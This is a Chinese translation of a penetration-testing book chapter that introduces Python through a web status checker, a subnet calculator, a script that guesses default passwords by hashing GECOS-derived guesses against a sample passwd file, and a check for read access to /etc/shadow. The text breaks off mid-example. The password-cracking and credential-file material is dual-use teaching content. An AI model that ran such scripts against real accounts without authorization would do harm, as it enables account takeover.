  \n# 第 2 章\n\n# Python 入门\n\n## 本章内容：\n\n• 什么是 Python？\n\n• Python 在哪些方面有用？\n\n•\
  \ Python 基础\n\n\n\n\n\n• 文件操作\n• 网络通信\n\n在渗透测试过程中，我们很可能会遇到需要快速生成工具或修改漏洞利用代码以执行基于网络的攻击的情况。这些攻击可能通过超文本传输协议（HTTP）等协议进行，也可能需要原始套接字交互。这些正是\
  \ Python 在渗透测试工具包中作为出色选项的领域。此外，UNIX 系统上通常已经预装了 Python，并带有与网络服务交互所需的大部分模块，可用于信息收集或漏洞利用。\n\
  \n在本章中，我们将利用 BackTrack 中 Python 的可用性来演示这些概念。我们将使用常用模块创建一个 Web 服务状态工具、一个子网计算器和一个基础密码破解器，同时还会探索\
  \ Scapy——一个用于处理和操纵网络流量的 Python 工具。\n\n## 什么是 Python？\n\nPython 是一种易于学习的脚本语言，自 20\
  \ 世纪 90 年代初诞生以来，其受欢迎程度一直不断上升 [[1]](#CHP002.html_BIB1)。它已成为安全工具的常见平台，因为它跨平台、模块化，并且附带大量辅助模块\
  \ [[2]](#CHP002.html_BIB2)。大多数现代 Linux 系统都包含 Python，因为它已成为众多配置工具和实用程序的基础。Python\
  \ 还能够通过 `py2exe`、`py2app` 和 `cx_freeze` 等工具将脚本移植到没有 Python 解释器的其他平台 [[3]](#CHP002.html_BIB3)。\n\
  \n警告\n\nPython 与本书中介绍的许多语言不同，它对空白字符敏感。也就是说，缩进很重要，因此你必须保持一致。\n\n### 从哪里获取 Python？\n\
  \n本章中的示例将引用 BackTrack Linux Live 发行版中默认的 Python 模块。这样做是为了方便使用和保持一致性，如果你想跟随文本进行操作，但理解这些概念并不要求必须使用\
  \ BackTrack。\n\n存在更高版本的 Python，但它们并未被广泛采用，且差异不在本书讨论范围之内。\n\nPython 也可用于多种其他平台。如果你不想使用\
  \ BackTrack Linux Live 发行版，且系统尚未安装 Python，可以访问 [www.python.org](http://www.python.org)\
  \ 下载 Python，或查找适用于你平台的预编译 Python 解释器。\n\n## Python 在哪些方面有用？\n\n优秀渗透测试人员与卓越渗透测试人员之间的一个区别在于快速适应不同情况的能力。Python\
  \ 非常适合编写快速脚本，用于交付漏洞利用、操纵已知网络协议以及创建自定义网络数据包。用于创建这类脚本的模块广泛可用，而 Scapy 和 Peach Fuzzing\
  \ Framework 等工具则提供了快速创建自定义数据包和协议模糊测试的框架。由于许多网络模块所需的设置工作极少，这类脚本通常可以用更少的代码行编写，从而降低了\
  \ Python 网络脚本编写的入门门槛。此外，由于语言本身要求正确的缩进，代码往往易于阅读。\n\nPython 的交互式 shell 减少了在尝试理解特定函数如何工作时的试错时间。交互式\
  \ shell 也有助于学习体验，这也是许多脚本新手发现 Python 更容易学习的原因之一。面向对象的方法也是一大优势，因为基本数据类型提供了额外的方法来简化基本任务。本书中的许多其他语言不具备这些特性。\n\
  \n### 跨平台脚本\n\n在执行渗透测试时，我们并不总是在自己的操作系统环境下工作。通过使用 Python 中与操作系统无关的网络和文件交互模块，我们通常可以在任何主机操作系统上使用相同的脚本执行相同的任务。这可以在渗透测试过程中节省我们的时间和精力。\n\
  \n### 网络脚本\n\n无论我们是测试 Web 服务器并需要通过 HTTP 通信，还是需要通过文件传输协议（FTP）自动化任务，Python 都提供了内置模块来简化网络交互。这些模块将处理与协议相关的所有内部细节。我们只需设置命令并处理结构化响应，以完成我们的目标。\n\
  \n以下是一个示例：我们想要验证某个统一资源定位符（URL）处的 Web 服务器是否响应。使用 Python，我们可以利用 HTTP 模块为该 URL 构建一个\
  \ HTTP 请求。Python 将返回数据，使我们能够确定 HTTP 响应代码，而无需进行文本匹配或其他响应解析。\n\n### 丰富的模块\n\nPython\
  \ 自带超过 1000 个模块，并且有许多仓库可以查找其他模块进行安装。此外，如果我们编写了自己的代码，并且这些代码可能对他人有用，Python 可以轻松地将我们的代码打包成可共享的模块。\n\
  \n提示\n\nPyPI（Python 包索引）位于 [`pypi.python.org/pypi`](http://pypi.python.org/pypi)，可用于查找其他\
  \ Python 模块。可以搜索、下载、扩展 Python 模块，并贡献回社区。当我们创建了能惠及他人的模块时，这里是回馈 Python 社区的好地方。\n\n\
  在 BackTrack Live 发行版中，进入 `/usr/lib/python2.5` 目录即可查看所有可用的 Python 模块。\n\n### 易于创建的可重用代码\n\
  \n代码重用对于高效的脚本编写至关重要，Python 提供了多种通过函数、类和模块轻松实现代码重用的方式。\n\n函数允许在特定脚本中重用小段代码，并且可以构建成易于在脚本之间复制的形式。\n\
  \n类可以创建为具有固定数据结构以及处理该数据结构的函数。在某些情况下，这些类可以从一个脚本复制到另一个脚本，而其他类可能足够大，需要放在它们自己的模块中。通过使用类，我们可以保持函数和数据的可移植性，而无需担心可能遗漏了哪些函数。\n\
  \n模块通常包含一个或多个类以及与之配合所需的函数。通过使用模块，我们根本不需要复制代码。如果模块已安装，我们就拥有了使用该模块中类所需的一切。我们还使用模块与他人共享代码。\n\
  \n## Python 基础\n\n在第 1 章中，我们介绍了许多脚本编写的基础知识。我们涵盖了循环、条件语句、函数等内容。我们将使用的许多语言都具有类似的功能，但语法和执行方式会因语言而异。在本节中，我们将探讨已介绍概念在语法和概念上的差异，以及它们如何应用于\
  \ Python 语言。\n\n### 入门\n\n我们需要在文本编辑器中创建 Python 文件。文本编辑器的选择因人而异。只要缩进保持一致，Python 就不会介意。对于那些还没有选定编辑器的人，第\
  \ 1 章中演示的 Kate 编辑器具有图形用户界面（GUI），并且使用简单。除了语法高亮之外，Kate 还能处理自动缩进，从而更容易避免因空白字符不一致而导致\
  \ Python 运行失败。\n\nPython 脚本是 `.py` 文件。例如，`hello.py` 可能是我们的第一个脚本。要使用 Kate，可以尝试输入\
  \ `kate hello.py` 来创建一个简单的脚本。\n\n#### 格式化 Python 文件\n\n\n\n\n在 Python 中，格式非常重要。Python\
  \ 解释器使用空白缩进来确定哪些代码片段以特殊方式组合在一起——例如，作为函数、循环或类的一部分。使用的空格数量通常不重要，只要保持一致即可。如果第一次缩进使用了两个空格，那么后续缩进也应使用两个空格。\n\
  \n### 运行 Python 文件\n\n让我们通过编写一个快速简单的脚本来熟悉 Python。将以下代码复制到文本编辑器中，并保存为 `hello.py`：\n\
  \n```python\n#!/usr/bin/python\n\nuser = \"<your name>\"\n\nprint \"Hello \" + user\
  \ + \"!\"\n```\n\n第一行将文件定义为 Python 脚本。在 Windows 中编写的脚本通常不需要这一行，但为了跨平台兼容性，无论平台如何，都可以包含它。它指定了将运行我们程序的\
  \ Python 可执行文件的路径。在第二行中，我们将名字赋值给一个名为 `user` 的变量。接下来，我们打印结果，使用*连接运算符*（加号）将变量与其余文本连接在一起。让我们试试看！\n\
  \n我们可以通过在 shell 窗口中输入 `python hello.py` 来运行脚本。Linux 或 UNIX 环境提供了另一种运行 Python 脚本的方式：我们可以通过输入\
  \ `chmod u+x hello.py` 使脚本可执行，然后输入 `./hello.py`。现在，使用 BackTrack，让我们来实现它！请参见图 2.1\
  \ 了解 BackTrack 的预期输出示例。\n\n![image](img/F000023f02-01-9781597497299.jpg)\n\n图 2.1\
  \ 在 Linux 中运行 Python 脚本的两种方式\n\n恭喜！你已经编写了第一个 Python 脚本。这很可能是你唯一一次编写 Python 脚本来向自己问好，所以让我们继续学习更有用的概念。\n\
  \n### 变量\n\nPython 提供了几种值得注意的变量类型：字符串、整数、浮点数、列表和字典。\n\n```python\n#!/usr/bin/python\n\
  \nmyString = \"This is a string!\" # 这是一个字符串变量\nmyInteger = 5 # 这是一个整数值\nmyFloat\
  \ = 5.5 # 这是一个浮点值\nmyList = [ 1, 2, 3, 4, 5] # 这是一个整数列表\nmyDict = { ’name’ : ’Python\
  \ User’, ’value’ : 75 } # 这是一个字典，键分别代表名称和值\n```\n\n一行中 `#` 之后的所有内容都不会被 Python 解释，而是被视为作者关于读者如何理解信息的注释。注释并非必需，但它们确实能帮助我们弄清楚昨晚到底做了什么。我们可以使用三个双引号在注释前后创建多行注释。让我们看一个例子。\n\
  \n```python\n#!/usr/bin/python\n\n\"\"\"\n这是一个 Python 注释。我们可以将它们写成多行\n\n   并且不必处理间距\n\
  \n     这使得创建可读的注释标题更容易\n\"\"\"\n\nprint \"And our code still works!\"\n```\n\n在\
  \ Python 中，每个变量类型都被视为一个类。如果将字符串赋值给一个变量，该变量将包含 `String` 类中的字符串，并且 `String` 类的方法和特性将适用于它。为了查看差异，我们将在\
  \ Python 交互模式下尝试一些字符串函数，只需在命令提示符下输入 `python`。请跟随图 2.2 在 `>>>` 标记后输入信息。\n\n![image](img/F000023f02-02-9781597497299.jpg)\n\
  \n图 2.2 在交互式 Python Shell 中进行字符串操作\n\n我们首先创建了一个名为 `myString` 的字符串。然后使用方括号运算符获取前四个字符。我们使用\
  \ `[:4]` 表示从字符串开头获取四个字符。这与使用 `[0:4]` 相同。接下来，我们使用 `replace` 函数将字符“o”更改为字符“0”。请注意，这不会更改原始字符串，而是输出一个包含更改的新字符串。最后，我们使用\
  \ `split` 方法，以空格作为分隔符，从字符串中创建了一个列表。我们将在本章后面解析网络输入时再次使用它。\n\n提示\n\n要了解更多字符串函数并自行测试，你可以访问\
  \ Python 字符串参考手册：[`docs.python.org/library/strings.html`](http://docs.python.org/library/strings.html)。\n\
  \n### 模块\n\nPython 允许通过模块对类和代码进行分组。当我们使用模块时，我们会“导入”它。通过导入，我们可以访问模块内部的类、类方法和函数。让我们通过图\
  \ 2.3 中的交互式 Python 会话进一步探索模块。\n\n![image](img/F000023f02-03-9781597497299.jpg)\n\
  \n图 2.3 使用 Python 交互式 Shell 导入模块\n\nPython 使得查找文本（例如密码）的 MD5 哈希变得非常容易。请注意，在导入模块之前，Python\
  \ 不知道我们要做什么。但一旦导入，我们就能得到原始值的十六进制哈希。\n\n提示\n\n`hashlib` 模块包含更多可以计算的哈希类型。完整的算法和方法列表可在\
  \ [`docs.python.org/library/hashlib.html`](http://docs.python.org/library/hashlib.html)\
  \ 找到。\n\n### 参数\n\n到目前为止，我们创建的脚本本质上是静态的。我们可以允许在命令行传递参数，以使脚本可用于不同的任务。两种实现方式是使用 `ARGV`\
  \ 和 `optparse`。`ARGV` 结构是一个列表，包含程序名称以及在命令行传递给应用程序的所有参数。这使用了 `sys` 模块。另一种选择是 `optparse`\
  \ 模块。它为参数处理提供了更多选项。我们稍后将详细探讨每种方式。\n\n在进行渗透测试时，我们所做的事情总是有可能对服务器产生不利影响。我们希望确保在测试期间，正在测试的服务保持正常运行。让我们使用\
  \ `sys` 模块和 `httplib` 模块创建一个执行 Web 请求的脚本。请按照以下步骤创建文件 `webCheck.py`，并使用 `chmod u+x\
  \ webCheck.py` 使其可执行。\n\n```python\n#!/usr/bin/python\n\nimport httplib, sys\n\n\
  if len(sys.argv) < 3:\n\n   sys.exit(\"Usage \" + sys.argv[0] + \" <hostname> <port>\\\
  n\")\n\nhost = sys.argv[1]\n\nport = sys.argv[2]\n\nclient = httplib.HTTPConnection(host,port)\n\
  \nclient.request(\"GET\",\"/\")\n\nresp = client.getresponse()\n\nclient.close()\n\
  \nif resp.status == 200:\n\n   print host + \" : OK\"\n\n   sys.exit()\n\nprint\
  \ host + \" : DOWN! (\" + resp.status + \" , \" + resp.reason + \")\"\n```\n\n这个脚本展示了如何在脚本内部导入模块。可以通过用逗号分隔来导入多个模块。然后我们进行一些基本的错误检查，以确定来自\
  \ `ARGV` 的参数列表至少包含三个元素。正在运行的脚本名称始终位于 `sys.argv[0]` 中。在这个脚本中，其他参数是我们的主机和要连接的端口。如果这些参数缺失，我们希望抛出错误并退出脚本。Python\
  \ 允许我们在一行中完成此操作。`sys.exit` 的返回码默认为 0（无错误），除非指定了其他值。在这种情况下，我们要求它显示错误，Python 会假定它应返回代码\
  \ 1（遇到错误），因为我们这样做了。如果我们想自定义错误代码，可以在该函数中使用任何数字。\n\n\n\n\n\n一旦我们将剩余的列表项分配到合适的变量中，就需要连接到服务器并请求我们的\
  \ URL。方法 `client.getresponse()` 会返回一个对象，其中包含响应码、响应码的原因以及用于获取所请求网页正文的其他方法。我们需要确保页面返回了\
  \ 200 状态码，这表示一切执行成功。如果确实收到了 200 状态码，我们就打印站点正常并成功退出脚本。如果没有收到 200 状态码，我们就打印站点宕机并说明原因。请注意，这里我们没有给\
  \ `sys.exit()` 指定数字。它应该默认 0 表示正常。然而，不依赖默认值并养成始终输入数字的习惯是一种好的做法。`resp.status` 会包含返回码，而\
  \ `resp.reason` 会解释返回码为何如此。这样我们就能知道站点是否宕机。\n\n如果我们想在测试期间监控某个站点以确保其持续在线，可以使用 `watch`\
  \ 命令。要每五秒更新一次，我们需要指定 `–n` 参数并将值设为 5。请参考图 2.4 作为示例。\n\n![image](img/F000023f02-04-9781597497299.jpg)\n\
  \n图 2.4 使用 ARGV 运行 webCheck.py\n\n当我们使用 ARGV 时，必须按特定顺序给出参数，并且需要处理所有错误检查以及变量值的分配。`optparse`\
  \ 模块提供了一个名为 `OptionParser` 的类，可以帮助我们解决这个问题。让我们通过修改 `webCheck.py` 来研究 `OptionParser`：\n\
  \n```\n#!/usr/bin/python\n\nimport httplib, sys\n\nfrom optparse import OptionParser\n\
  \nusageString = \"Usage: %prog [options] hostname\"\n\nparser = OptionParser(usage=usageString)\n\
  \nparser.add_option(\"-p\", \"--port\", dest=\"port\", metavar=\"PORT\",\n\n   \
  \  default=80, type=\"int\", help=\"Port to connect to\")\n\n(opts,args) = parser.parse_args()\n\
  \nif len(args) < 1:\n\n  parser.error(\"Hostname is required\")\n\nhost = args[0]\n\
  \n…\n```\n\n从这一点开始，脚本的其余部分相同。我们首先从 `optparse` 模块中只导入 `OptionParser` 类。我们创建一个用法说明，并将其传递给解析器，然后定义解析器并将该说明作为用法选项传递。我们可以直接将其传递给解析器而不先将其设为变量，但使用变量既更易读，也允许我们在其他地方重用该用法说明（如果愿意）。如果脚本使用\
  \ `–h` 标志运行，`OptionParser` 将显示我们的用法说明。\n\n由于大多数 Web 服务运行在端口 80 上，我们可能并不总想在运行脚本时输入端口号。因此我们添加一个选项，允许在命令行中指定端口。我们告诉解析器，`–p`\
  \ 和 `–port` 都可以用来指定端口。`Metavar` 告诉我们 `–p` 或 `–port` 标志需要什么参数，而 `help` 标志则为详细帮助显示定义帮助文本。`default`\
  \ 值是我们说端口 80 最常见的地方，而 `dest` 是变量名，如果我们不使用默认值，则会在其中存储不同的值。注意这一行之后的缩进。缩进告诉解释器我们正在继续之前的语句。这允许我们以更易读的方式拆分代码行。\n\
  \n现在选项设置完毕，我们调用解析器类的 `parse_opts` 方法。输出设置两个变量：`opts` 和 `args`。`Opts` 通过我们指定的选项设置，而\
  \ `args` 是命令行中传递的其他任何内容，在本例中即主机名。从这里开始，除了主机和端口值的来源不同外，其他一切工作方式相同。我们的主机是 `args` 列表中的第一项，而端口可以直接从\
  \ `opts` 对象中指定。\n\n让我们测试一下新程序。请看图 2.5。\n\n![image](img/F000023f02-05-9781597497299.jpg)\n\
  \n图 2.5 使用 OptionParser 运行 webCheck.py\n\n### 列表\n\n假设我们需要将一个无类别域间路由（CIDR）格式的 IP\
  \ 地址转换为 IP 范围和子网掩码。CIDR 格式是一种更简洁地表达 IP 地址信息的方式。它不列出完整的网络信息，而只包含 IP 地址和子网掩码中的位数。有几种方法可以实现这一点：我们可以手动计算、使用子网计算器或编写脚本。既然你在读一本关于脚本的书，我们可能应该使用脚本。这也将让我们有机会探索列表。列表是\
  \ Python 中的数组版本。它们是拥有自己方法的对象。让我们编写类似这样的内容：\n\n```\nroot@bt:~# ./subcalc.py 192.168.1.1/24\n\
  ```\n\n首先，我们要将输入（`192.168.1.1/24`）拆分为 CIDR 和 IP 地址，以便单独处理。\n\n```\naddrString,cidrString\
  \ = sys.argv[1].split(’/’)\n```\n\n字符串的 `split` 方法总是返回一个列表。在本例中，我们的列表将有两个值：IP 地址（我们将其放入\
  \ `addrString` 变量）和 CIDR 表示法（我们将其放入 `cidrString` 变量）。我们告诉 `split` 使用斜杠来确定将字符串拆分为列表元素的位置。\n\
  \n现在，我们要对 IP 地址进行类似的操作，以便单独解析每个八位组：\n\n```\naddr = addrString.split(’.’)\n```\n\n\
  这次我们使用句点作为分隔符，并使用 `addr` 存储我们的八位组列表。但有一个问题：我们得到了一堆字符串。我们需要用它们进行数学计算，以计算广播参数、子网掩码，最终得到我们的\
  \ IP 地址。所以让我们将 CIDR 转换为整数。\n\n注意\n\n如需复习子网划分和 CIDR 地址，请访问附录：子网划分与 CIDR 地址，其中我们详细介绍了这一切在网络层的工作原理！\n\
  \n```\ncidr = int(cidrString)\n```\n\n现在我们可以开始确定子网掩码了。让我们从 `0.0.0.0` 开始，并使用 CIDR\
  \ 逐步累加：\n\n```\nmask = [0,0,0,0]\n\nfor i in range(cidr):\n\n   mask[i/8] = mask[i/8]\
  \ + (1 << (7 - i % 8))\n```\n\n哇，内莉！这段代码在做什么？\n\n要确定我们的网络，我们需要确定该掩码中有多少位。这就是 CIDR。我们从左侧（IP\
  \ 的 192 一侧）开始设置位，从最高有效位开始，向右移动到最低有效位。CIDR 掩码为 1 将得到子网掩码值 `128.0.0.0`，而 CIDR 值为 24\
  \ 应得到子网掩码值 `255.255.255.0`。\n\n在这个脚本中，我们将使用二进制位移操作，在 CIDR 定义的范围内从左到右设置位。我们使用 `for`\
  \ 循环遍历这个范围并进行计算。用文字描述这个计算是：取当前迭代器与 8 的模。用 7 减去它。将 1 左移那么多位。然后将迭代器的值除以 8 以确定我们正在操作哪个八位组，并将该列表值加到结果中。将这个结果放入字符串中由当前位除以\
  \ 8 确定的位置。然后继续对下一个位执行相同操作。\n\n这是一种相当繁琐的获取结果的方式。但这是一个学习练习，而且我们正在讨论列表。\n\n现在我们有了子网掩码，就可以计算网络\
  \ IP 了。我们首先创建一个空列表来存储结果。然后遍历网络 IP 的所有四个八位组，对原始输入 IP 和之前的子网掩码执行二进制与运算。\n\n```\nnet\
  \ = []\n\nfor i in range(4):\n\n   net.append(int(addr[i]) & mask[i])\n```\n\n别忘了，我们原始的地址列表仍然是字符串。当我们从命令行读取它时，它将数字视为文本。所以我们使用\
  \ `int` 函数进行转换，以便进行数学计算。`append` 方法将计算出的值添加到列表末尾。\n\n现在我们知道网络 IP 和子网掩码，就可以计算广播地址了：\n\
  \n```\n# 根据 CIDR 地址确定广播参数，并复制网络地址\n\nbroad = list(net)\n\nbrange = 32 - cidr\n\n\
  for i in range(brange):\n```\n\n\n\n\n\n```\nbroad[3 - i/8] = broad[3 - i/8] + (1\
  \ << (i % 8))\n```\n\n由于广播将基于我们的网络 IP，因此我们将列表复制到一个新变量中。`list` 方法会创建 `net` 的一个副本列表，这样当你修改时就不会同时改变\
  \ `broad` 列表和 `net` 列表。为了确定我们的广播地址，我们将主机位重新加回网络地址，从而计算出该网络中的最后一个 IP 地址。为此，我们从最后一位开始，从右向左计数，设置位，直到所有位都被设置。\n\
  \n现在我们有了所有地址，需要打印这些信息。问题是我们拥有整数数组，打印时必须将每个单独的元素转换为字符串。我们可以通过 `map` 来克服这个限制，它会对数组中的每个元素执行一个函数：\n\
  \n```\n\".\".join(map(str,mask))\n```\n\n通过使用 `map`，我们将子网掩码中的每个整数转换为字符串。这样我们就得到了一个字符串列表。接下来我们可以使用\
  \ `join` 将它们连接起来。`join` 函数使用一个分隔符将列表中的元素组装成一个字符串，每个元素由该分隔符分隔。现在我们应该拥有组合最终程序所需的一切。让我们尝试一下，并验证一切是否正常：\n\
  \n```\n#!/usr/bin/python\n\nimport sys\n\n# Get address string and cidr string from\
  \ command line\n\n(addrString,cidrString) = sys.argv[1].split(’/’)\n\n# split address\
  \ into octets and turn cidr into int\n\naddr = addrString.split(’.’)\n\ncidr = int(cidrString)\n\
  \n#initialize the netmask and calculate based on cidr mask\n\nmask = [0,0,0,0]\n\
  \nfor i in range(cidr):\n\n   mask[i/8] = mask[i/8] + (1 << (7 - i % 8))\n\n#initialize\
  \ net and binary and netmask with addr to get network\n\nnet = []\n\nfor i in range(4):\n\
  \n   net.append(int(addr[i]) & mask[i])\n\n#duplicate net into broad array, gather\
  \ host bits, and generate\n\n#broadcast\n\nbroad = list(net)\n\nbrange = 32 - cidr\n\
  \nfor i in range(brange):\n\n   broad[3 - i/8] = broad[3 - i/8] + (1 << (i % 8))\n\
  \n# Print information, mapping integer lists to strings for easy printing\n\nprint\
  \ \"Address: \" , addrString\n\nprint \"Netmask: \" , \".\".join(map(str,mask))\n\
  \nprint \"Network: \" , \".\".join(map(str,net))\n\nprint \"Broadcast \" , \".\"\
  .join(map(str,broad))\n```\n\n现在，查看 图 2.6 中的输出。\n\n![image](img/F000023f02-06-9781597497299.jpg)\n\
  \n图 2.6 subnet.py 的输出\n\n我们现在有了一个可用的代码示例，它以多种方式使用了列表。虽然这提供了使用列表的一些基础知识，但我们将在本章下一节的示例中进一步探讨其中一些主题。\n\
  \n### 字典\n\n字典为 Python 提供了关联数组功能。当我们希望对列表元素进行标记时，就会使用字典。例如，我们可以将用户 ID 映射到员工姓名，或者将多个漏洞关联到特定主机。\n\
  \n为了研究字典，让我们从一个实际示例开始。公司可能会根据某种模式为用户设置一个标准的初始密码。这可能包括使用与个人相关的字母和数字——例如，名字的首字母加上人力资源部门分配的员工\
  \ ID。如果我们找到了一个影子密码文件，并且知道密码是如何计算的，我们或许就能确定哪些用户使用了默认密码。\n\n假设我们找到了一个密码文件：\n\n```\n\
  kevin:jP5RTBmoSymUI:42:42:Kevin,,,,42:/home/kevin:/bin/bash\nryan:AlQD3NnPMW5sE:1000:1000:Ryan,,,,431:/home/ryan:/bin/bash\n\
  jason:aPg1C.EYrD0bw:1001:1001:Jason,,,,739:/home/jason:/bin/bash\ndon:JCZ0WIUo0XvBc:1002:1002:Don,,,,831:/home/don:/bin/bash\n\
  ed:skOrAUx/yNdD2:1337:1337:Ed,,,,1337:/home/ed:/bin/bash\n```\n\n注意\n\n快速回顾一下密码文件中的字段：该文件以冒号分隔，第一个字段是用户名。第二个字段是加密后的密码。第三个字段是\
  \ GECOS，这是一个以逗号分隔的字段，包含用户的全名、办公地点或联系人、办公室电话号码以及其他联系信息。第四个字段是主目录，最后一个字段是 shell。\n\
  \n使用 BackTrack Live CD 中的 John The Ripper 等程序，我们发现 Ryan 的密码是 R431，似乎基于 GECOS 字段中的最后一个数字与名字的首字母组合而成。这可能是默认密码的生成方式，因此让我们编写一个\
  \ Python 脚本来检查其他用户是否具有类似的模式：\n\n```\n#!/usr/bin/python\n\nimport sys\n\nimport crypt\n\
  \nf = open(sys.argv[1],\"r\")\n\nlines = f.readlines()\n\nf.close()\n```\n\n`crypt`\
  \ 模块允许我们在 Python 内部计算加密后的密码。我们打开命令行中传入的文件名，并指定以只读方式打开。我们将文件行读入一个名为 `lines` 的列表，然后关闭文件。\n\
  \n```\nfor line in lines:\n\n   data = line.split(’:’)\n\n   # Set username and\
  \ password to first 2 fields\n\n   user,password = data[0:2]\n\n   geco = data[4].split(’,’)\n\
  \n   # Create password guess using first char of first name and last field\n\n   guess\
  \ = geco[0][0] + geco[-1]\n\n   #Assign salt as first 2 characters of crypted password\n\
  \n   salt = password[0:2]\n```\n\n我们需要拆分每一行，以获取构建密码猜测所需的相关信息。我们将每个字段作为名为 `data`\
  \ 列表中的一个元素，然后将 `data` 的前两个字段分配给变量 `user` 和 `password`。我们可以使用语法 `list[start:end]`\
  \ 轻松地从列表中创建片段，该语法会将数组从第一个元素拆分到最后一个元素（但不包括最后一个元素）。\n\n接下来，我们通过查看 GECOS 信息第一个字段的第一个字符，并将其与\
  \ GECOS 信息的最后一个字段组合，来创建密码猜测。我们可以使用负索引来获取数组中的最后一个元素。负索引从数组末尾向前计数，但最常用于引用数组的最后一个元素。\n\
  \n```\nif crypt.crypt(guess,salt) == password:\n\n   userInfo = { \"user\" : user,\
  \ \"pass\" : guess, \"home\" : data[5],\n\n     \"uid\" : data[2] , \"name\" : geco[0]}\n\
  \n   found.append(userInfo)\n```\n\n现在我们有了猜测，可以测试当前用户的密码是否等于我们的猜测值。加密后的密码使用一个称为\
  \ `salt` 的随机化值，使其更难破解。每次使用不同的盐值，这样即使两个人拥有相同的密码，加密后的值也会不同。在加密值中，盐值是前两个字符，因此如果我们使用与加密密码相同的盐值来加密我们的猜测，如果匹配，我们将得到相同的加密值。因此，我们检查哈希值，如果匹配，就成功了。\n\
  \n接下来，我们需要构建信息，以便以后可以轻松访问。对于这个脚本，我们只打算打印找到的内容，但将来你可能可以将其改编用于其他用途。我们将所有数据放入一个哈希中，以便可以使用收集到的每条信息。为了创建字典，我们将在花括号（`{}`）内指定一个键和值的列表。我们将该值赋给名为\
  \ `userInfo` 的变量。然后，我们通过 `append` 函数将字典添加到之前创建的 `found` 列表中：\n\n```\nfor user in\
  \ found:\n\n   print \"User : %s \" % user[’user’]\n\n   for k in user.keys():\n\
  \n     if k == \"user\":\n\n       continue\n\n     print \"\\t%s : %s\" % (k,user[k])\n\
  ```\n\n\n\n\n最后，我们应该知道哪些用户仍然使用默认密码。现在我们必须将它们打印出来以便使用。为此，我们使用一个 for 循环遍历 `found`\
  \ 列表，并将每个字典赋值给 `user` 变量。我们可以使用 `keys` 函数枚举返回的列表，以获取字典中使用的所有键。此时，我们可以打印关于用户的其他信息，排除实际的\
  \ `user` 字段。现在我们已经组合好了脚本，让我们验证输出：\n\n```\n#!/usr/bin/python\n\nimport sys\n\nimport\
  \ crypt\n\n# Read file into lines\n\nf = open(sys.argv[1],\"r+\")\n\nlines = f.readlines()\n\
  \nf.close()\n\nfound = []\n\nfor line in lines:\n\n   data = line.split(’:’)\n\n\
  \   # Set username and password to first 2 fields\n\n   user,password = data[0:2]\n\
  \n   geco = data[4].split(’,’)\n\n   # Create password guess using first char of\
  \ first name and last field\n\n   guess = geco[0][0] + geco[-1]\n\n   # Assign salt\
  \ as first 2 characters of crypted password\n\n   salt = password[0:2]\n\n   # Check\
  \ crypted value to see if matches, if yes put in found\n\n   if crypt.crypt(guess,salt)\
  \ == password:\n\n     userInfo = { \"user\" : user, \"pass\" : guess, \"home\"\
  \ : data[5],\n\n       \"uid\" : data[2] , \"name\" : geco[0]}\n\n     found.append(userInfo)\n\
  \nfor user in found:\n\n   print \"User : %s \" % user[’user’]\n\n   for k in user.keys():\n\
  \n     if k == \"user\":\n\n       continue\n\n     print \"\\t%s : %s\" % (k,user[k])\n\
  ```\n\n以下是我们的输出：\n\n```\n$ ./pass.py passwd\n\nUser : ryan\n\n   uid : 1000\n\n\
  \   home : /home/ryan\n\n   name : Ryan\n\n   pass : R431\n\nUser : jason\n\n  \
  \ uid : 1001\n\n   home : /home/jason\n\n   name : Jason\n\n   pass : J739\n\nUser\
  \ : don\n\n   uid : 1002\n\n   home : /home/don\n\n   name : Don\n\n   pass : D831\n\
  ```\n\n我们可以看到示例中有用户使用了默认密码。\n\n我们已经介绍了字典的基础知识，但字典还可以通过其他方式创建。图 2.7 展示了另外两个创建字典的示例，可能会有所帮助。\n\
  \n![image](img/F000023f02-07-9781597497299.jpg)\n\n图 2.7 使用交互式 Python 尝试字典的不同调用方法\n\
  \n在第一个实例中，我们指定了用逗号分隔的键值对。这很直接，类似于我们在脚本中的做法。第二种方法使用一个元组列表，即有序的信息对，传递给 `dict` 函数。每个键值对都括在圆括号中，让函数知道它们应该被分组在一起。没有创建字典的最佳方法；某些方法在某些情况下可能更容易，但使用哪种方法主要取决于个人偏好。\n\
  \n### 控制语句\n\n到目前为止，我们在创建的脚本中遇到了多种控制语句类型。还有其他控制脚本执行的方法。在本节中，我们将介绍条件语句和循环。\n\n条件语句是决定代码执行路径的决策点。生成这些语句的两种最常见方式是通过比较运算符和返回真或假的函数。比较运算符与大多数其他语言一致，但你可以参考表\
  \ 2.1。\n\n表 2.1 Python 条件运算符\n\n![Image](img/T000023tabT0010.jpg)\n\n#### If 语句\n\
  \n我们在本章中已经看到了这些条件语句的实际应用，但它们被用于简单的 if 语句。让我们看一个更复杂的例子。\n\n```\n#!/usr/bin/python\n\
  \nimport os\n\nmyuid = os.getuid()\n\nif myuid == 0:\n\n   print \"You are root\"\
  \n\nelif myuid < 500:\n\n   print \"You are a system account\"\n\nelse:\n\n   print\
  \ \"You are just a regular user\"\n```\n\n这段代码首先从操作系统获取登录用户的用户 ID。然后检查它是否等于 0。如果是，该比较返回真，它将打印\"\
  你是 root 用户\"。elif 语句允许我们在相同的缩进内添加额外的条件进行更多检查。如果所有的 if 和 elif 语句都不返回真，则默认条件为 else。\n\
  \n现在让我们看一个修改后的示例，其中我们使用一个函数来检查我们是否可以读取 shadow 文件。我们使用 `os.access` 方法来测试。我们想知道是否可以读取该文件，因此我们使用常量\
  \ `os.R_OK` 来表示我们想知道文件是否可读。如果我们能读取 shadow 文件，我们最终就能获得 root 密码。这就是一些渗透测试人员所说的“胜利”。否则，我们将不得不尝试其他方法。\n\
  \n```\n#!/usr/bin/python\n\nimport os\n\nif os.getenv(’USER\") == \"root\":\n\n\
  \   print \"You are root\"\n\nelif os.getuid() == 0:\n\n   print \"You are sudo\
  \ as root\"\n\nelif os.access(’/etc/shadow’,os.R_OK):\n\n   print \"You aren’t root,\
  \ but you can read shadow\"\n\nelse:\n\n   print \"No soup for you\"\n```\n\n####\
  \ 循环\n\n循环对于重复操作更为有用。两种基本的循环类型是 for 循环和 while 循环。For 循环遍历列表，而 while 循环一直运行直到满足条件或我们跳出循环。我们在之前的脚本（例如\
  \ `pass.py`）中使用了 for 循环，但还没有见过 while 循环：\n\n```\nwhile 1:\n\n   if i > 0 and i <\
  \ 10:\n\n     i = i + 5\n\n     continue\n\n   elif i % 2 == 0 :\n\n     print \"\
  EVEN\"\n\n   elif i % 3 == 0:\n\n     print \"ODD\"\n\n   elif i % 25 == 0:\n\n\
